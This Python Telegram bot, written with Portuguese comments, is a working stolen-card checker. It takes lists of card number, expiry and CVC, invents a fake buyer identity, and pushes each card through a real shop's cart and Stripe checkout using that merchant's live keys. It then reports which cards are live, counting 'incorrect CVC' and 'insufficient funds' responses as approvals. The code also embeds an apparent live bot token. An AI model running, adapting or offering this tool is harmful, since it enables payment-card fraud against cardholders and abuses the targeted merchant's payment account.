import telebot
import requests
import json
import time
import re
import uuid
import random
import os
from urllib.parse import urlparse, parse_qs

# --- CONFIGURAÇÕES DO BOT ---
# No Railway, você pode definir o TOKEN nas 'Variables' do projeto como TELEGRAM_TOKEN
# Se não estiver definido lá, ele usará o valor padrão abaixo.
TOKEN = os.getenv("TELEGRAM_TOKEN", "8806372148:AAG5KvpIAcO97IM-A00DfznguWu5eQ5qGp0")
bot = telebot.TeleBot(TOKEN)

# --- CONFIGURAÇÃO DA LOJA ---
CLIENT_ID = "353352"
DEFAULT_ITEM_ID = "1822081" 
STRIPE_PK = "pk_live_UUFYTQ63roIxScFWo9jLfco5"
STRIPE_ACC = "acct_1Rtyo96jrfFSQm3Z"

# --- INDICADORES DE APROVAÇÃO ---
APPROVED_INDICATORS = [
    "Your card's security code is incorrect.",
    "incorrect_cvc",
    "AuthorizeResult",
    "Approved",
    "Transaction Authorized",
    "succeeded",
    "authorized",
    "requires_capture",
    "processing",
    "pass",
    "insufficient_funds",
    "charge.succeeded",
    "stripe:success",
]

def generate_full_identity():
    first_names = ["Guilherme", "Rodrigo", "Felipe", "Lucas", "Gabriel", "Mateus", "Bruno", "Tiago", "Rafael", "Leonardo"]
    last_names  = ["Souza", "Silva", "Santos", "Oliveira", "Pereira", "Lima", "Costa", "Ferreira", "Rodrigues", "Almeida"]
    domains     = ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com", "icloud.com"]
    addresses = [
        {"street": "1050 S Flower St", "city": "Los Angeles", "state": "CA", "zip": "90015"},
        {"street": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "zip": "60606"},
        {"street": "1097 Howard St", "city": "San Francisco", "state": "CA", "zip": "94103"},
        {"street": "1720 2nd Ave", "city": "New York", "state": "NY", "zip": "10128"},
        {"street": "2101 4th Ave", "city": "Seattle", "state": "WA", "zip": "98121"}
    ]
    first = random.choice(first_names)
    last  = random.choice(last_names)
    addr  = random.choice(addresses)
    email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@{random.choice(domains)}"
    return {
        "first_name": first, "last_name": last, "full_name": f"{first} {last}",
        "email": email, "address": addr["street"], "city": addr["city"], 
        "state": addr["state"], "zip": addr["zip"], "phone": f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    }

def is_approved_response(response_text):
    for indicator in APPROVED_INDICATORS:
        if indicator.lower() in response_text.lower():
            return True
    return False

def check_card(card_data):
    try:
        parts = card_data.strip().split('|')
        if len(parts) < 4: return "❌ Formato inválido"
        cc_num, cc_month, cc_year, cc_cvv = parts[0], parts[1], parts[2], parts[3]
        if len(cc_year) == 2: cc_year = "20" + cc_year
    except:
        return "❌ Erro nos dados"

    identity = generate_full_identity()
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    try:
        # Passo 1: Inicializar Carrinho
        init_url = f"https://www.fatfreecartpro.com/ecom/gbv3.php?c=cart&ejc=2&cl={CLIENT_ID}&i={DEFAULT_ITEM_ID}&add=1&initialize=1"
        resp_init = session.get(init_url, headers={'user-agent': ua}, timeout=20)
        
        id_match = re.search(r'\"id\":(\d+)', resp_init.text)
        md5_match = re.search(r'\"md5\":\"([a-f0-9]{32})\"', resp_init.text)
        
        if not id_match: return "❌ Erro Cart ID"
        cart_id = id_match.group(1)
        cart_md5 = md5_match.group(1)

        # Passo 2: Tokenização Stripe
        headers_stripe = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua}
        data_stripe = {
            'type': 'card', 'card[number]': cc_num, 'card[cvc]': cc_cvv, 'card[exp_month]': cc_month,
            'card[exp_year]': cc_year[2:], 'guid': str(uuid.uuid4()), 'muid': str(uuid.uuid4()), 'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js/e1fb22ad35', 'key': STRIPE_PK, '_stripe_account': STRIPE_ACC,
        }
        resp_stripe = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
        
        if resp_stripe.status_code != 200:
            err = resp_stripe.json().get('error', {}).get('message', 'Erro Stripe')
            return f"❌ Reprovado (Stripe) -> {err}"

        pm_id = resp_stripe.json().get('id')

        # Passo 3: Checkout Final
        payload_val = {
            "payment_method_id": pm_id, "cart_id": cart_id, "cart_md5": cart_md5,
            "first_name": identity['first_name'], "last_name": identity['last_name'], "email": identity['email']
        }
        resp_val = session.post('https://www.fatfreecartpro.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php', 
                                headers={'content-type': 'application/json', 'user-agent': ua}, json=payload_val, timeout=25)
        
        resp_text = resp_val.text
        try:
            site_msg = resp_val.json().get('message') or resp_val.json().get('error') or "Erro desconhecido"
        except:
            site_msg = resp_text[:50]

        if is_approved_response(resp_text):
            return f"✅ Aprovado! -> {site_msg}"
        else:
            return f"❌ Reprovado -> {site_msg}"

    except Exception as e:
        return f"⚠️ Erro: {str(e)}"

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "🚀 **Bot OMPLACE Online no Railway!**\n\nEnvie sua lista no formato:\n`NUMERO|MES|ANO|CVC` (um por linha)")

@bot.message_handler(commands=['chk'])
def chk_cards(message):
    msg_text = message.text.replace('/chk', '').strip()
    if not msg_text:
        bot.reply_to(message, "❌ Use: `/chk NUMERO|MES|ANO|CVC`", parse_mode="Markdown")
        return

    cards = msg_text.split('\n')
    status_msg = bot.reply_to(message, f"⏳ Processando {len(cards)} cartões...")
    
    results = []
    for i, card in enumerate(cards):
        if not card.strip(): continue
        res = check_card(card)
        results.append(f"💳 `{card.strip()}`\nResult: {res}")
        
        if (i + 1) % 2 == 0 or (i + 1) == len(cards):
            full_res = "📊 **Resultados:**\n\n" + "\n\n".join(results)
            try:
                bot.edit_message_text(full_res, message.chat.id, status_msg.message_id, parse_mode="Markdown")
            except:
                pass
        time.sleep(2)

@bot.message_handler(func=lambda message: True)
def auto_chk(message):
    if '|' in message.text:
        chk_cards(message)

if __name__ == "__main__":
    print("Bot iniciado com sucesso...")
    bot.infinity_polling()

